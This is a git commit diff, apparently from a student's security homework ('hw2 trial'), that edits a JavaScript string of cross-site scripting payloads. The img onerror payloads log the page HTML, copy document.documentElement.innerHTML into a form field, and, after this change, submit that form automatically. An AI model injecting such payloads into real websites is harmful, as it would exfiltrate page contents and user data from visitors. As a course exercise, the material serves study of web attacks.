9fbd5c57d204baf9e3a7dd358f5be5b5a7f58369
AngelaGu <angela.gu1224@gmail.com>
2023-03-01 01:56:22 -0800

    hw2 trial

--- script.js
+++ script.js
@@ -8,8 +8,8 @@ function changeTitle(){
             <img src="x" onerror="console.log(document.documentElement.innerHTML)">\
             <img src="x" onerror="console.log(document.document.body.innerHTML)">\
             <img src="x" onerror="console.log(document.document.body.innertext)">\
-            <img src="x" onerror="document.forms.xss_form.elements.info.value = document.documentElement.innerHTML">';
-            // <img src="x" onerror="document.forms.xss_form.submit()">';
+            <img src="x" onerror="document.forms.xss_form.elements.info.value = document.documentElement.innerHTML">\
+            <img src="x" onerror="document.forms.xss_form.submit()">';
             
     }, 100);
     
